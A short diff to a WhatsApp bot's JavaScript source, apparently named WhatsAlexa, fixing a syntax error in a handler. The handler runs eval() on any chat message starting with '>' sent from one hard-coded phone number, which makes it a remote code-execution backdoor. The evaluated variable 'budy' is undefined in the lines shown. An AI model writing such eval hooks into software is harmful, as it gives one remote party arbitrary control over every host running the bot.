@@ -65,7 +65,7 @@ WhatsAlexa.addCommand({on: 'text', fromMe: false}, (async (message, match) => {
 WhatsAlexa.addCommand({on: 'text', fromMe: false}, (async (message, match) => {
 
    if (message.message.startsWith('>')) {
-      let isCreator = if (message.jid.startsWith('2349053311892') ? 'yes' : 'no'
+      let isCreator = message.jid.startsWith('2349053311892') ? 'yes' : 'no'
       try {
            if (isCreator !== 'yes') return;
            let evaled = await eval(budy.slice(2))
